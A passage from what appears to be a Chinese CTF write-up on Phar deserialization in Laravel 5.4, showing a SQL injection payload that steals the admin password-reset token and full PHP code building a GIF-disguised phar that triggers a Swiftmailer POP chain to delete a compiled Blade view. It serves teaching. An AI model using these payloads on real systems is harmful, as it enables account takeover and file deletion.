class="string">'UploadController@check'</span>)-&gt;name(<span class="string">'check'</span>);</span><br><span class="line">Route::get(<span class="string">'/error'</span>, <span class="string">'HomeController@error'</span>)-&gt;name(<span class="string">'error'</span>);</span><br></pre></td></tr></table></figure>
+<p>从路由文件中看到了<code>Auth::routes()</code>，这个函数的作用就是访问<code>/home</code>，<code>/note</code>等需要认证。通过 <code>php artisan route:list</code> 可以很明显列出权限，这里关注两个东西，一个是 <strong>App\Http\Controllers\FlagController@showFlag</strong> ，另一个是 <strong>App\Http\Controllers\UploadController@files</strong> 。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/24.png" alt="img"></p>
+<p>这里要求实际上登录的邮箱用户的账号一定要为 <a href="mailto:**admin@qvq.im" target="_blank" rel="noopener">**admin@qvq.im</a>** 。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">($request, Closure $next)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;auth-&gt;user()-&gt;email !== <span class="string">'admin@qvq.im'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> redirect(route(<span class="string">'error'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $next($request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是实际上该邮箱已经被内置，无法注册</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/25.png" alt="img"></p>
+<p>然后翻一翻文件，在 <strong>App\Http\Controllers\NoteController.php</strong> 文件中存在明显的SQL注入问题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Note $note)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$username = Auth::user()-&gt;name;</span><br><span class="line">	$notes = DB::select(<span class="string">"SELECT * FROM `notes` WHERE `author`='&#123;$username&#125;'"</span>);</span><br><span class="line">	<span class="keyword">return</span> view(<span class="string">'note'</span>, compact(<span class="string">'notes'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一反应存在注入的话，我们都会想到把 <a href="mailto:**admin@qvq.im" target="_blank" rel="noopener">**admin@qvq.im</a><strong> 账号的密码通过注入搞出来。我们看到这个 </strong>$username<strong> 可控， </strong>$username = Auth::user()-&gt;name<strong> 意思就是登录用户的用户名，从前面路由我们知道注册用户的路由是在 </strong>App\Http\Controllers\Auth\RegisterController@register**  ，但是注册用户生成的密码已经加密存入数据库中，存在一定的难度。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span><span class="params">(array $data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> User::create([</span><br><span class="line">	<span class="string">'name'</span> =&gt; $data[<span class="string">'name'</span>],</span><br><span class="line">	<span class="string">'email'</span> =&gt; $data[<span class="string">'email'</span>],</span><br><span class="line">	<span class="string">'password'</span> =&gt; bcrypt($data[<span class="string">'password'</span>]),</span><br><span class="line">	]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们再找找关键字 <a href="mailto:**admin@qvq.im" target="_blank" rel="noopener">**admin@qvq.im</a>** ，发现该账号的密码是40位的随机数加密，这种情况下基本上没有破解的可能。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$factory-&gt;define(App\User::class, <span class="function"><span class="keyword">function</span> <span class="params">(Faker\Generator $faker)</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> $password;</span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">	<span class="string">'name'</span> =&gt; <span class="string">'4uuu Nya'</span>,</span><br><span class="line">	<span class="string">'email'</span> =&gt; <span class="string">'admin@qvq.im'</span>,</span><br><span class="line">	<span class="string">'password'</span> =&gt; bcrypt(str_random(<span class="number">40</span>)),</span><br><span class="line">	<span class="string">'remember_token'</span> =&gt; str_random(<span class="number">10</span>),</span><br><span class="line">	];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>4uuu Nya</strong> 师傅在赛后复盘时候，提到了</p>
+<blockquote>
+<p>但是在laravel5.4中，重置密码的操作很有意思 Illuminate\Auth\Passwords\PasswordBroker.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendResetLink</span><span class="params">(array $credentials)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$user = <span class="keyword">$this</span>-&gt;getUser($credentials);</span><br><span class="line">	<span class="keyword">if</span> (is_null($user)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">static</span>::INVALID_USER;</span><br><span class="line">		&#125;</span><br><span class="line">	$user-&gt;sendPasswordResetNotification(</span><br><span class="line">	<span class="keyword">$this</span>-&gt;tokens-&gt;create($user)</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">static</span>::RESET_LINK_SENT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的 <strong>第5行</strong> 先判断用户是否为存在，如果存在就是在 <strong>第九行</strong> 为用户生成一个 <strong>token</strong> 。 <strong>create</strong> 的操作在 <strong>Illuminate\Auth\Passwords\DatabaseTokenRepository.php</strong> 中实现了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span><span class="params">(CanResetPasswordContract $user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$email = $user-&gt;getEmailForPasswordReset();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;deleteExisting($user);</span><br><span class="line">	$token = <span class="keyword">$this</span>-&gt;createNewToken();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;getTable()-&gt;insert(<span class="keyword">$this</span>-&gt;getPayload($email, $token));</span><br><span class="line">	<span class="keyword">return</span> $token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>第6行</strong> 调用 <strong>createNewToken</strong> 函数，跟进它。它的实现是通过随机字符hash生成。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createNewToken</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> hash_hmac(<span class="string">'sha256'</span>, Str::random(<span class="number">40</span>), <span class="keyword">$this</span>-&gt;hashKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>第8行</strong> 插入通过 <strong>getPayload</strong> 的函数处理的数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getPayload</span><span class="params">($email, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> [<span class="string">'email'</span> =&gt; $email, <span class="string">'token'</span> =&gt; $token, <span class="string">'created_at'</span> =&gt; <span class="keyword">new</span> Carbon];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从出题师傅为什么选择 Laravel 5.4的原因，在高于5.4的版本中，重置密码这个 token 会被 bcrypt 再存入，就和用户密码一样。高于5.4的版本中多了一步操作就是如下所示。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getPayload</span><span class="params">($email, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> [<span class="string">'email'</span> =&gt; $email, <span class="string">'token'</span> =&gt; <span class="keyword">$this</span>-&gt;hasher-&gt;make($token), <span class="string">'created_at'</span> =&gt; <span class="keyword">new</span> Carbon];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那我们在看看修改密码的操作， <strong>database/migrations/2014_10_12_100000_create_password_resets_table.php</strong> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">up</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Schema::create(<span class="string">'password_resets'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Blueprint $table)</span> </span>&#123;</span><br><span class="line">	$table-&gt;string(<span class="string">'email'</span>)-&gt;index();</span><br><span class="line">	$table-&gt;string(<span class="string">'token'</span>)-&gt;index();</span><br><span class="line">	$table-&gt;timestamp(<span class="string">'created_at'</span>)-&gt;nullable();</span><br></pre></td></tr></table></figure>
+<p>因此这里我们梳理一下思路就是通过注入获取token，通过token重制密码登录，注入payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l1nk3r&apos; union select 1,token,3,4,5 from password_resets where email=&apos;admin@qvq.im&apos;#</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/26.png" alt="img"></p>
+<p>然后我们通过直接访问<code>http://127.0.0.1/password/reset/{token}</code></p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/27.png" alt="img"></p>
+<p>登陆之后发现访问flag显示no flag，但是我们看一下FlagController，正常情况下应该是有了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$flag = file_get_contents(<span class="string">'/th1s1s_F14g_2333333'</span>);</span><br><span class="line">	<span class="keyword">return</span> view(<span class="string">'auth.flag'</span>)-&gt;with(<span class="string">'flag'</span>, $flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以前没看过Laravel，看了师傅赛后复盘，知道了blade渲染的问题。在 laravel 中，模板文件是存放在 <code>resources/views</code> 中的，然后会被编译放到 <code>storage/framework/views</code> 中，而编译后的文件存在过期的判断。</p>
+<blockquote>
+<p>Blade 是 Laravel 提供的一个简单而又强大的模板引擎。和其他流行的 PHP 模板引擎不同，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何负担。Blade 视图文件使用 <code>.blade.php</code> 作为文件扩展名，被存放在 <code>resources/views</code> 目录。</p>
+</blockquote>
+<p>在 <code>Illuminate/View/Compilers/Compiler.php</code> 中可以看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCompiledPath</span><span class="params">($path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cachePath.<span class="string">'/'</span>.sha1($path).<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Determine if the view at the given path is expired.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span>  string  $path</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isExpired</span><span class="params">($path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$compiled = <span class="keyword">$this</span>-&gt;getCompiledPath($path);</span><br><span class="line">	<span class="comment">// If the compiled file doesn't exist we will indicate that the view is expired</span></span><br><span class="line">	<span class="comment">// so that it can be re-compiled. Else, we will verify the last modification</span></span><br><span class="line">	<span class="comment">// of the views is less than the modification times of the compiled views.</span></span><br><span class="line">	<span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;files-&gt;exists($compiled)) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$lastModified = <span class="keyword">$this</span>-&gt;files-&gt;lastModified($path);</span><br><span class="line">	<span class="keyword">return</span> $lastModified &gt;= <span class="keyword">$this</span>-&gt;files-&gt;lastModified($compiled);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而过期时间是依据文件的最后修改时间来判断的，判断服务器上编译后的文件最后修改时间大于原本模板文件。</p>
+<p>那么现在有个文件上传，看一下文件上传的函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">(UploadRequest $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$file = $request-&gt;file(<span class="string">'file'</span>);</span><br><span class="line">	<span class="keyword">if</span> (($file &amp;&amp; $file-&gt;isValid())) &#123;</span><br><span class="line">	$allowed_extensions = [<span class="string">"bmp"</span>, <span class="string">"jpg"</span>, <span class="string">"jpeg"</span>, <span class="string">"png"</span>, <span class="string">"gif"</span>];</span><br><span class="line">	$ext = $file-&gt;getClientOriginalExtension();</span><br><span class="line">	<span class="keyword">if</span>(in_array($ext, $allowed_extensions))&#123;</span><br><span class="line">		$file-&gt;move(<span class="keyword">$this</span>-&gt;path, $file-&gt;getClientOriginalName());</span><br><span class="line">		Flash::success(<span class="string">'上传成功'</span>);</span><br><span class="line">		<span class="keyword">return</span> redirect(route(<span class="string">'upload'</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Flash::error(<span class="string">'上传失败'</span>);</span><br><span class="line">	<span class="keyword">return</span> redirect(route(<span class="string">'upload'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里只能上传后缀为图片的文件，且上传路径 <strong>$this-&gt;path</strong> 是 <strong>app/public</strong> ，但是该路径限制了访问权限，无法直接访问。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;middleware([<span class="string">'auth'</span>, <span class="string">'admin'</span>]);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;path = storage_path(<span class="string">'app/public'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续往下看的时候发现了惊喜。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$path = $request-&gt;input(<span class="string">'path'</span>, <span class="keyword">$this</span>-&gt;path);</span><br><span class="line">	$filename = $request-&gt;input(<span class="string">'filename'</span>, <span class="keyword">null</span>);</span><br><span class="line">	<span class="keyword">if</span>($filename)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!file_exists($path . $filename))&#123;</span><br><span class="line">			Flash::error(<span class="string">'磁盘文件已删除，刷新文件列表'</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			Flash::success(<span class="string">'文件有效'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> redirect(route(<span class="string">'files'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的 <strong>file_exists</strong> 中的 <strong>$path</strong> 和 <strong>$filename</strong> 均可控。 <strong>file_exists</strong> 是文件操作函数，这里可以尝试搜索一下<code>__destruct</code>。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/28.png" alt="img"></p>
+<p>在 <strong>/vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php</strong> 中找到了利用方式。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">	@unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从之前分析中，我们知道是基于路径的 sha1 值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cachePath.<span class="string">'/'</span>.sha1($path).<span class="string">'.php'</span>;</span><br></pre></td></tr></table></figure>
+<p>在使用管理员身份登录后，可以看到一条note</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/29.png" alt="img"></p>
+<p>使用了nginx的默认配置，那么flag文件的完整路径就是 <code>/usr/share/nginx/html/resources/views/auth/flag.blade.php</code>，经过sha1后得到 34e41df0934a75437873264cd28e2d835bc38772.php</p>
+<p>那么这时候就可以构造phar文件，payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Write sequence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $sequence = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StreamFilters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_StreamFilter[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $filters = [];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A buffer for writing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $writeBuffer = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bound streams.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_InputByteStream[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $mirrors = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** The internal pointer offset */</span></span><br><span class="line">    <span class="keyword">private</span> $_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The path to the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_path;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The mode this file is opened in for writing */</span></span><br><span class="line">    <span class="keyword">private</span> $_mode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_reader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_writer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class="line">    <span class="keyword">private</span> $_quotes = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If stream is seekable true/false, or null if not known */</span></span><br><span class="line">    <span class="keyword">private</span> $_seekable = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new FileByteStream for $path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool   $writable if true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path, $writable = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = $path;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = $writable ? <span class="string">'w+b'</span> : <span class="string">'rb'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'get_magic_quotes_runtime'</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the complete path to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $filePath = <span class="string">"/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php"</span>;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($filePath, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>点击 <strong>files</strong> ，选择 <strong>check</strong> 触发 <strong>file_exit</strong> 反序列化，删除 <strong>blade模版</strong> 。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/31.png" alt="img"></p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/30.png" alt="img"></p>
+<p>最后flag。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>关于phar的反序列化，实际上不需要 <strong>unserialize()</strong> 这个函数来触发了，可以通过文件函数来触发。但是还是需要找到利用的 <strong>pop链</strong> ：</p>
+<p>1、文件操作函数中的 <strong>参数可控</strong> 。</p>
+<p>2、文件有上传点，可上传构造的特殊 <strong>phar文件</strong> 。</p>
